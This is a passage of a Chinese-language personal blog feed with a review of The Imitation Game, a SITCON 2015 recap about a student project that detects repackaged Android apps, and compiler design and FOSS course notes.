&lt;li&gt;「我和你有不同的地方，你會為悲傷的電影哭泣，而我會對花粉過敏，人們是有差異性的 」  &lt;/li&gt;
&lt;li&gt;「請告訴我，我是人？還是機器？是二戰英雄？還是罪犯？」「我無法判斷你是什麼。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;關於破解 Enigma 的方面，呈現了他的天資聰穎以及那種無意的、不近人情的自傲，&lt;br /&gt;
但其實以現在來看，很明顯就屬於亞斯伯格症的範疇。&lt;br /&gt;
甚至是之後破解了 Enigma，也處於非常理性的狀態，&lt;br /&gt;
而阻止了可能讓德軍得知 Enigma 已經被破解的事實。  &lt;/p&gt;
&lt;p&gt;在同性戀的部分，描述了從小與人不同，遭受到暴力的霸凌，&lt;br /&gt;
而 Christopher Morcom 的拯救，與他們之間非常頻繁的互動，讓他發現自己是個同性戀的事實。&lt;br /&gt;
然而在校長告知 Alan Turing 關於 Christopher Morcom 死於慢性肺結核時，&lt;br /&gt;
他卻極力否認自己與他的親密關係，顯然是他自己也知道這在英國屬於犯法的事。&lt;br /&gt;
而 Alan Turing 所打造的用來破譯 Enigma 的機器就被他命名為 Christopher，&lt;br /&gt;
可以看出他對 Alan Turing 有多麼的重要。  &lt;/p&gt;
&lt;p&gt;還有出現了三次，&lt;br /&gt;
第一次由 Christopher Morcom 對 Alan Turing、&lt;br /&gt;
第二次是 Alan Turing 對 Joan Clarke 說、&lt;br /&gt;
第三次則是 Joan Clarke 在 Alan Turing 已經遭到化學閹割，&lt;br /&gt;
並肯定 Alan Turing 的一番作為時的這句話，&lt;br /&gt;
無異是本片想要再三強調的核心概念。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Sometimes it's the very people who no one imagines anything of who do the things that no one can imagine.&lt;br /&gt;
有時候，正是一個無法讓人預料到的人，能做出讓人無法預料到的事。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而影片僅有出現兩次 Alan Turing 在跑步的畫面，&lt;br /&gt;
沒提到 Alan Turing 其實是個體力很好的馬拉松好手。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;From &lt;a href="https://zh.wikipedia.org/zh-tw/%E8%89%BE%E4%BC%A6%C2%B7%E5%9B%BE%E7%81%B5"&gt;艾倫·圖靈 - 維基百科，自由的百科全書&lt;/a&gt;:&lt;br /&gt;
圖靈還是一位世界級的長跑運動員。&lt;br /&gt;
他的馬拉松最好成績是2小時46分3秒，比1948年奧林匹克運動會金牌成績慢11分鐘。&lt;br /&gt;
1948年的一次跨國賽跑比賽中，他跑贏了同年奧運會銀牌得主湯姆·理查茲（Tom Richards）  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然後要幫電影勘誤一下，&lt;br /&gt;
我們至今仍稱呼 Turing Machine 為 Turing Machine 而不是 Computer。&lt;br /&gt;
但 Turing Machine 的確影響了今日電腦的發展，&lt;br /&gt;
作為後來的電腦在邏輯處理上的典範，&lt;br /&gt;
至今也仍然是正規語言課程中必定會提到的教材。&lt;br /&gt;
&lt;a href="http://en.wikipedia.org/wiki/Turing_machine"&gt;Turing machine - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;最後附上影評一篇 &lt;a href="http://www.movier.tw/post.php?SID=53826"&gt;幕迷影評 | 破解《模仿遊戲》內含隱喻──解析電影敘事、圖靈論文與三大母題&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;敬 Alan Turing、敬和平、敬不凡的人們、敬同性戀、敬英國的轉型正義、敬這部電影。  &lt;/p&gt;</summary><category term="Vocabulary"></category><category term="Movie"></category><category term="The Imitation Game"></category><category term="Alan Turing"></category><category term="English"></category></entry><entry><title>SITCON 2015 - Android Repackaged App Detection System</title><link href="https://blog.m157q.tw/posts/2015/03/11/sitcon-2015-android-repackaged-app-detection-system/" rel="alternate"></link><published>2015-03-12T00:05:27+08:00</published><updated>2015-03-12T00:05:27+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-11:posts/2015/03/11/sitcon-2015-android-repackaged-app-detection-system/</id><summary type="html">&lt;p&gt;先說說關於今年 SITCON 的感想好了&lt;br /&gt;
關於 Talk 的部分可能會敘述比較長XD  &lt;/p&gt;
&lt;h2&gt;關於 SITCON 2015&lt;/h2&gt;
&lt;p&gt;今年我除了聽最前面兩場由梁伯嵩及 Kaede 主講的 keynote 以外&lt;br /&gt;
其他都沒有聽 因為都在做簡報 XDrz  這種趕死線的壞習慣真的該改...&lt;br /&gt;
（但不知道為啥每次靈感都會在死線前有如泉湧）  &lt;/p&gt;
&lt;p&gt;能夠見到看到 CCCA 創社社長梁伯嵩先生的演講真的很感動&lt;br /&gt;
從網路的起始開始講起&lt;br /&gt;
再提到當時 CCCA 在交大做的那些開路先鋒的事&lt;br /&gt;
至今在社辦都還找得到當年的文件、書籍及辦活動留下來的物品&lt;br /&gt;
雖然現在待的這個社團或許在歷史上有些紛紛擾擾&lt;br /&gt;
但我仍認為這個社團的前身就是 CCCA&lt;br /&gt;
以過去那些 CCCA 的前輩為榜樣&lt;br /&gt;
參加 Conf 真的是讓自己疲憊的身心再次注入熱血的動力  &lt;/p&gt;
&lt;p&gt;Kaede 介紹的廣義的駭客&lt;br /&gt;
現場有些學生可能無法接受&lt;br /&gt;
但看過許多駭客文化的介紹或許就比較能夠了解&lt;br /&gt;
Hacker 是無論哪個領域都有的&lt;br /&gt;
只要你非常專注于該領域 然後闖出了一番傑出的表現 甚至是造福這個世界&lt;br /&gt;
都可以被稱作為 Hacker  這是個尊稱 而不是被現今媒體抹滅的污名  &lt;/p&gt;
&lt;p&gt;今年最猛的大概就是在 R0 的超華麗的導播設備了&lt;br /&gt;
據說是跟金馬獎用的同一套&lt;br /&gt;
還有在 R0 比較後面的區域加掛了螢幕&lt;br /&gt;
讓後面的人也能清楚看見台上的人的演說神情&lt;br /&gt;
真的很過癮&lt;br /&gt;
感謝辛苦的工作人員們 帶給我這麼一場精彩的會議  &lt;/p&gt;
&lt;p&gt;剩下的時間真的都是在趕簡報&lt;br /&gt;
順便跟剛好遇到的 jserv 聊天&lt;br /&gt;
真的很佩服 jserv 的犧牲奉獻精神&lt;br /&gt;
在聊天的過程中也感受到自己的某些觀念還不夠成熟&lt;br /&gt;
跟資工相關的許多觀念也還唸的不夠透徹&lt;br /&gt;
意識到自己只是一味的喜歡 coding&lt;br /&gt;
卻忽略了 Algorithm, Data Structure, Operating System, Computer Organization, Assembly 等等&lt;br /&gt;
那些課本上的知識&lt;br /&gt;
或許是因為當時被迫考試的關係 才感到厭惡&lt;br /&gt;
現在回頭過來其實蠻後悔自己沒有認真把那些前人的智慧化為己用&lt;br /&gt;
是時候趁著這股動力和熱血 把那些遺忘的觀念複習一下了&lt;br /&gt;
偷偷附上一張與 jserv 的合照&lt;br /&gt;
&lt;img alt="with jserv" src="/files/sitcon-2015-android-repackaged-app-detection-system/jserv.jpg" /&gt;&lt;br /&gt;
圖片原連結：&lt;a href="https://www.flickr.com/photos/sitcon/16818827202/in/set-72157649003614643"&gt;https://www.flickr.com/photos/sitcon/16818827202/in/set-72157649003614643&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;雖然第一年因為幫忙 Open House 而沒參與到 SITCON (當時還在台科大舉辦)&lt;br /&gt;
但第二屆和第三屆都有幸成為講者&lt;br /&gt;
也許也是最後一次了吧&lt;br /&gt;
目前沒有繼續往研究所升學的打算&lt;br /&gt;
大概今年就要去從容就義 報效國家了XD&lt;br /&gt;
真的希望資訊教育能夠持續的推廣下去  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;關於本次的 Talk&lt;/h2&gt;
&lt;h3&gt;Android Repackaged App Detection System&lt;/h3&gt;
&lt;p&gt;本次演講的投影片在此&lt;br /&gt;
&lt;a href="https://speakerdeck.com/m157q/sitcon2015-android-repackaged-app-detection-system-by-shunyi"&gt;https://speakerdeck.com/m157q/sitcon2015-android-repackaged-app-detection-system-by-shunyi&lt;/a&gt;&lt;br /&gt;
&lt;script async class="speakerdeck-embed" data-id="6ab309bf1d5f42ecbeb4bace486631e8" data-ratio="1.33333333333333" src="//speakerdeck.com/assets/embed.js"&gt;&lt;/script&gt;  &lt;/p&gt;
&lt;p&gt;主要就是介紹在大學時做的專題&lt;br /&gt;
因為嘗試將許多現有的開放原始碼軟體整合起來&lt;br /&gt;
剛好跟今年的主題 The Ture Hacker 相呼應&lt;br /&gt;
投影片裡也有提到原因&lt;br /&gt;
主要就是 esr (&lt;a href="http://en.wikipedia.org/wiki/Eric_S._Raymond"&gt;Eric S. Raymond - Wikipedia, the free encyclopedia&lt;/a&gt;)&lt;br /&gt;
在網路上的一篇知名文章 &lt;a href="http://www.catb.org/esr/faqs/hacker-howto.html"&gt;How To Become A Hacker&lt;/a&gt;&lt;br /&gt;
裡頭提到了  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;No problem should ever have to be solved twice.&lt;/strong&gt;&lt;br /&gt;
Creative brains are a valuable, limited resource.&lt;br /&gt;
They shouldn't be wasted on re-inventing the wheel when there are so many fascinating new problems waiting out there.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這個專題真的結合了很多現有的 Open Source 專案去達到我們想做的事&lt;br /&gt;
最後一頁的投影片列出了所有用到的 Open Source 專案&lt;br /&gt;
過程中也學到了很多東西&lt;br /&gt;
Dalvik, smali, baksmali, Data Dependence, Flow Dependence, ...&lt;br /&gt;
嘗試了很多語言和相關的專案  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Perl  &lt;/li&gt;
&lt;li&gt;Python  &lt;ul&gt;
&lt;li&gt;Scrapy  &lt;/li&gt;
&lt;li&gt;NetworkX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Java  &lt;ul&gt;
&lt;li&gt;Unofficial Google Play API  &lt;/li&gt;
&lt;li&gt;SAAF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JavaScript  &lt;ul&gt;
&lt;li&gt;Node.js  &lt;/li&gt;
&lt;li&gt;D3.js  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其實中間也 survey 了很多不同的工具&lt;br /&gt;
雖然最後沒有採用&lt;br /&gt;
依稀記得的有&lt;br /&gt;
Wala, graph-tool 以及各種 Unofficial Android third party marketplace API&lt;br /&gt;
也很感謝陳仲寬學長在這過程之中給我們很大的幫忙&lt;br /&gt;
無論是在傳授給我們相關的知識亦或是給予我們相關論文來閱讀&lt;br /&gt;
還有國科會計劃申請書的參考範本也是來自學長當年的申請書  &lt;/p&gt;
&lt;p&gt;雖然這個專案離我們當初構想的最後完成體還差的有點多&lt;br /&gt;
原本預計還要加入 Machine Learning 讓判斷相似度的部分可以更自動及更有系統地分析&lt;br /&gt;
以及想要利用 Open Stack 亦或是 Docker 進行部署&lt;br /&gt;
採用雲端運算加快相似度比對的速度&lt;br /&gt;
這些都因為自身能力不足&lt;br /&gt;
而無法如期的完成到這個部分&lt;br /&gt;
老實說 就連相似度的 threshold 要訂在哪我們都還不是很有把握  &lt;/p&gt;
&lt;p&gt;話說國科會計劃的結報好像也快到了該交出的死線日期了&lt;br /&gt;
至少三月底前要交出吧？&lt;br /&gt;
希望可以利用這幾天的時間把結報寫一寫&lt;br /&gt;
然後把 Source Code 整理後釋出&lt;br /&gt;
因為要用到各種不同的 Open Source Project&lt;br /&gt;
所以開始學習怎麼用 git submodule&lt;br /&gt;
Python 純粹是因為個人喜好所以採用&lt;br /&gt;
而 JavaScript 則是當時想碰 所以就用了&lt;br /&gt;
也感謝我的好夥伴兼好室友江泓樂配合我採用各種程式語言的任性&lt;br /&gt;
感謝強者小樂常常在看論文方面給我蠻大的幫助&lt;br /&gt;
因為我不是那麼喜歡看論文XDrz&lt;br /&gt;
以及在我大三同時兼任&lt;br /&gt;
系計中助教、Open House 資訊組組長、網路福利社社長、汪汪社副社長&lt;br /&gt;
還修了一堆課 忙碌到擠不出什麼時間 導致有時無故缺席 meeting 的時候&lt;br /&gt;
還能包容我 告訴我預計的進度應該到哪  &lt;/p&gt;
&lt;p&gt;Trace 許多 Source Code 之後&lt;br /&gt;
仍然深深感到自己的能力不足&lt;br /&gt;
看 Code 及理解 Code 的速度不夠快&lt;br /&gt;
在自己撰寫程式碼的方面&lt;br /&gt;
也明顯感受到了開發經驗與速度的不足&lt;br /&gt;
各種方面都還有待加強  &lt;/p&gt;
&lt;p&gt;在農曆新年後 以這場 Talk 作為新年的開始&lt;br /&gt;
希望新的一年 自己也能不斷地學習新的知識&lt;br /&gt;
把想唸的書唸完 繼續增強自己的開發能力&lt;br /&gt;
向那些 True Hackers 看齊 利用自己所掌握的資訊開發能力&lt;br /&gt;
努力讓這個世界變得更好  &lt;/p&gt;
&lt;p&gt;寫到這邊突然好想再重看一次&lt;a href="http://www.books.com.tw/products/0010548392"&gt;黑客列傳：電腦革命俠客誌(25週年紀念版)&lt;/a&gt;&lt;br /&gt;
讓自己回到半世紀前 感受當時那些時代先驅們的熱血精神  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;SITCON 2015 相簿連結&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.flickr.com/photos/sitcon/sets/72157649003614643/"&gt;Sitcon 2015 - an album on Flickr&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.flickr.com/photos/sitcon/sets/72157649027037894/"&gt;Sitcon2015 幕後花絮 - an album on Flickr&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.flickr.com/photos/sitcon/sets/72157650915441780/"&gt;SITCON2015 by 海哥 - an album on Flickr&lt;/a&gt; // 這個拍超多妹子...  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Conf"></category><category term="SITCON"></category><category term="Python"></category><category term="Perl"></category><category term="Java"></category><category term="JavaScript"></category><category term="Scrapy"></category><category term="NetworkX"></category><category term="SAAF"></category><category term="node.js"></category><category term="d3.js"></category><category term="Android"></category><category term="Note"></category><category term="Thought"></category></entry><entry><title>Compiler Design Week 3</title><link href="https://blog.m157q.tw/posts/2015/03/10/compiler-design-week-3/" rel="alternate"></link><published>2015-03-19T16:00:00+08:00</published><updated>2015-03-19T16:00:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-10:posts/2015/03/10/compiler-design-week-3/</id><summary type="html">&lt;h2&gt;2015/03/10&lt;/h2&gt;
&lt;h3&gt;Left-Recursion Grammar &amp;amp; Right-Recursion Grammar&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;兩者可以互轉&lt;/li&gt;
&lt;li&gt;Left-Recursion =&amp;gt; Left Associate, Right-Recursion =&amp;gt; Right Associate.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Left-Recursion Conversion&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;S -&amp;gt; Sα | β

to

S  -&amp;gt; βS&amp;#39;
S&amp;#39; -&amp;gt; αS&amp;#39; | ɛ
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Parser for a Grammar&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Top-down Parser / LL(1) Parser&lt;/li&gt;
&lt;li&gt;Bottom-up Parser / LR(1) Parser&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Chapter 3 - Regular Expression&lt;/h2&gt;
&lt;h3&gt;Regular Expression&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Regular Expresssion aka Regular Grammar, Regular Language, Regular, Regex  &lt;/li&gt;
&lt;li&gt;* - Kleene Closure&lt;ul&gt;
&lt;li&gt;aka Kleene Operator, Kleene Star.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Kleene_star"&gt;Kleene star - Wikipedia, the free encyclopedia&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;FSA - Finite State Automata&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Regular Expression &amp;lt;=&amp;gt; Finite State Machine&lt;/li&gt;
&lt;li&gt;5-tuple (Q, Σ, δ, q。, F)&lt;ul&gt;
&lt;li&gt;Q - a set of states&lt;/li&gt;
&lt;li&gt;Σ - an input alphabet, symbol.&lt;/li&gt;
&lt;li&gt;δ - a transition function&lt;/li&gt;
&lt;li&gt;q。 - the initial state&lt;/li&gt;
&lt;li&gt;F - a set of final states&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DFA vs NFA&lt;/li&gt;
&lt;li&gt;Finite =&amp;gt; State 數量是有限的&lt;/li&gt;
&lt;li&gt;沒有 Memory, 無法記憶 alphabet 的數量&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Thompson Construction&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Thompson%27s_construction_algorithm"&gt;Thompson's construction algorithm - Wikipedia, the free encyclopedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Transforms a given regular expression into an equivalent nondeterministic finite automaton (NFA)&lt;/li&gt;
&lt;li&gt;Establishing a conversion between two of many description formats for regular languages.&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Cousre"></category><category term="Compiler"></category></entry><entry><title>FOSSAPC 2015 Spring Week #2</title><link href="https://blog.m157q.tw/posts/2015/03/09/fossapc-2015-spring-week-2/" rel="alternate"></link><published>2015-03-09T23:40:43+08:00</published><updated>2015-03-09T23:40:43+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-09:posts/2015/03/09/fossapc-2015-spring-week-2/</id><summary type="html">&lt;p&gt;因為配合課程的需求&lt;br /&gt;
就直接看 Hackpad 吧  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://fossapc.hackpad.com/2015-FOSS-Week-2-Note#2015-FOSS-Week-2-Note"&gt;2015 FOSS Week #2 Note - fossapc.hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;之後應該就不另外再寫 markdown 記錄了&lt;br /&gt;
雖然還是不太喜歡直接用 hackpad&lt;br /&gt;
太多人的時候還是會噴 502&lt;br /&gt;
以及同時多人中文輸入還是會有打架的問題&lt;br /&gt;
也許可以考慮之後都用英文來記錄&lt;br /&gt;
好像也是個不錯的選擇  &lt;/p&gt;</summary><category term="Course"></category><category term="FOSS"></category></entry><entry><title>Compiler Design week 2</title><link href="https://blog.m157q.tw/posts/2015/03/03/compiler-design-week-2/" rel="alternate"></link><published>2015-03-05T15:38:00+08:00</published><updated>2015-03-05T15:38:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-03:posts/2015/03/03/compiler-design-week-2/</id><summary type="html">&lt;h2&gt;2015/03/03&lt;/h2&gt;
&lt;h3&gt;Evolution of Programming Languages&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/List_of_programming_languages_by_type"&gt;List of programming languages by type - Wikipedia, the free encyclopedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Categorize by feature&lt;ul&gt;
&lt;li&gt;Imperative&lt;/li&gt;
&lt;li&gt;Delcarative&lt;/li&gt;
&lt;li&gt;Von Neumann&lt;/li&gt;
&lt;li&gt;Object-Oriented&lt;/li&gt;
&lt;li&gt;Functional&lt;/li&gt;
&lt;li&gt;Assignment-Oriented&lt;/li&gt;
&lt;li&gt;Scripting&lt;ul&gt;
&lt;li&gt;Python, JavaScript, AWK&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Categorize by Generation&lt;ul&gt;
&lt;li&gt;1st Gen - Machine&lt;/li&gt;
&lt;li&gt;2nd Gen - Assembly&lt;/li&gt;
&lt;li&gt;3rd Gen - Structural Programming (C, Pascal)&lt;/li&gt;
&lt;li&gt;4th Gen - SQL&lt;/li&gt;
&lt;li&gt;5th Gen - Prolog (logic inference)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Memory Hierarchies&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Memory Hierarchies&lt;ul&gt;
&lt;li&gt;Registers&lt;/li&gt;
&lt;li&gt;Scratch Memory&lt;/li&gt;
&lt;li&gt;Local Memory&lt;/li&gt;
&lt;li&gt;Cache&lt;/li&gt;
&lt;li&gt;Remote Memory&lt;/li&gt;
&lt;li&gt;Disk&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;對商用 Compiler 來說，記憶體的架構很重要，會對 Performance 造成頗重大的影響。&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Out-of-core_algorithm"&gt;Out-of-core Algorithm&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;Designed to process data that is too large to fit into a computer's main memory at one time.&lt;/li&gt;
&lt;li&gt;Must be optimized to efficiently fetch and access data stored in slow bulk memory such as hard drives or tape drives.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Binary Translation&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;操作位置較接近 Machine code, 而不是 Assembly code&lt;/li&gt;
&lt;li&gt;Input: Machine Code, Output: Another Machine Code or Assembly Code&lt;ul&gt;
&lt;li&gt;ARM Machine Code =&amp;gt; (Binary Translation) =&amp;gt; X86 / MIPS / Andes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Scope&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;分類&lt;ul&gt;
&lt;li&gt;Static Binding (Lexical Binding)&lt;ul&gt;
&lt;li&gt;Scheme, C++, C, Java&lt;/li&gt;
&lt;li&gt;直接看 program 的 scope，以最接近的那個上層為主。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dynamic Binding&lt;ul&gt;
&lt;li&gt;Lisp&lt;/li&gt;
&lt;li&gt;從 runtime 的順序反推回去找&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fluid Binding (Dynamic Assignments)&lt;ul&gt;
&lt;li&gt;&lt;code&gt;var := expr during stmt-body&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;當成可以指定特殊條件的 Static Binding&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;指如何處理 free variable，對於 bound variable 沒有啥問題，無需處理。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Parameter Passing Schemes&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;call by value / call by in&lt;/li&gt;
&lt;li&gt;call by result / call by out&lt;/li&gt;
&lt;li&gt;call by value result / call by in Out&lt;/li&gt;
&lt;li&gt;call by address (本質上為 call by value or call by value of pointer)&lt;/li&gt;
&lt;li&gt;call by reference&lt;ul&gt;
&lt;li&gt;沒有產生額外的 storage&lt;/li&gt;
&lt;li&gt;任何修改都會直接反應到 argument&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;call by reference 的變形。三者都使用 Late Binding&lt;ul&gt;
&lt;li&gt;call by name&lt;ul&gt;
&lt;li&gt;binding per use&lt;/li&gt;
&lt;li&gt;caller environment&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;call by text&lt;ul&gt;
&lt;li&gt;binding per use&lt;/li&gt;
&lt;li&gt;callee environment&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;call by need (lazy evaluation)&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Lazy_evaluation"&gt;Lazy evaluation - Wikipedia, the free encyclopedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;binding at first time use&lt;/li&gt;
&lt;li&gt;caller environment&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Chapter 2&lt;/h2&gt;
&lt;h3&gt;Chomsky Hierarchy&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Non-R.E.&lt;/li&gt;
&lt;li&gt;R.E.（RecursivelyEnumerable）&lt;/li&gt;
&lt;li&gt;Context-Sensitive Grammar&lt;/li&gt;
&lt;li&gt;Context-Free Grammar (CFG)&lt;/li&gt;
&lt;li&gt;Regular Expression (regex) &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Halting Problem&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Halting_problem"&gt;Halting problem - Wikipedia, the free encyclopedia&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Context-Free Grammar&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Backus%E2%80%93Naur_Form"&gt;Backus–Naur Form - Wikipedia, the free encyclopedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;BNF (Backus-Naur Form / Backus Normal Form)&lt;ul&gt;
&lt;li&gt;one of the two main notation techniques for context-free grammars.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;G = (V, T, P, S)&lt;ul&gt;
&lt;li&gt;V - A set of non-terminals&lt;/li&gt;
&lt;li&gt;T - A set of Terminals&lt;/li&gt;
&lt;li&gt;P - A set of Production Rules&lt;/li&gt;
&lt;li&gt;S - Starting Symbol&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;2015/03/05&lt;/h2&gt;
&lt;h3&gt;Terminology&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Alphabet&lt;/li&gt;
&lt;li&gt;String&lt;/li&gt;
&lt;li&gt;Language&lt;ul&gt;
&lt;li&gt;L, L(G)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Grammar&lt;ul&gt;
&lt;li&gt;G&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Derivation Tree&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Parse_tree"&gt;Parse tree - Wikipedia, the free encyclopedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Not to be confused with Abstract syntax tree.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;分類&lt;ul&gt;
&lt;li&gt;直&lt;/li&gt;
&lt;li&gt;橫&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;write grammar for balanced expression with '{' and '}'&lt;ul&gt;
&lt;li&gt;balanced: 左右括號數目要相同&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;write grammr for Palindrome (迴文) &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Ambiguous Grammar&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Ambiguous_grammar"&gt;Ambiguous grammar - Wikipedia, the free encyclopedia&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Un-Ambiguous Grammar&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;add &lt;strong&gt;Precedence&lt;/strong&gt; into Ambiguous Grammar&lt;ul&gt;
&lt;li&gt;Precedence 低的在外部&lt;/li&gt;
&lt;li&gt;Precedence 高的在內部&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Course"></category><category term="Compiler"></category></entry><entry><title>FOSSAPC 2015 Spring Week #1</title><link href="https://blog.m157q.tw/posts/2015/03/02/fossapc-2015-spring-week-1/" rel="alternate"></link><published>2017-10-05T20:56:39+08:00</published><updated>2017-10-05T20:56:39+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-02:posts/2015/03/02/fossapc-2015-spring-week-1/</id><summary type="html">&lt;p&gt;配合課程使用 Hackpad&lt;br /&gt;
後續更新請看 &lt;a href="https://fossapc.hackpad.com/2015-FOSS-Week-1-Note-JHXVNsJzbeX"&gt;2015 FOSS Week #1 Note - fossapc.hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Android Bionic  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/android/platform_bionic"&gt;https://github.com/android/platform_bionic&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Bionic_(software)"&gt;http://en.wikipedia.org/wiki/Bionic_(software)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;How A Compiler Works&lt;/h3&gt;
&lt;h4&gt;課程連結：&lt;a href="https://sites.google.com/site/fossapc/list-of-lectures/fromsourcetobinarygnutoolchainshiruheyunzuo"&gt;20150302 - From Source to Binary: GNU Toolchain 是如何運作？ - 自由開源軟體與專案協作&lt;/a&gt;&lt;/h4&gt;
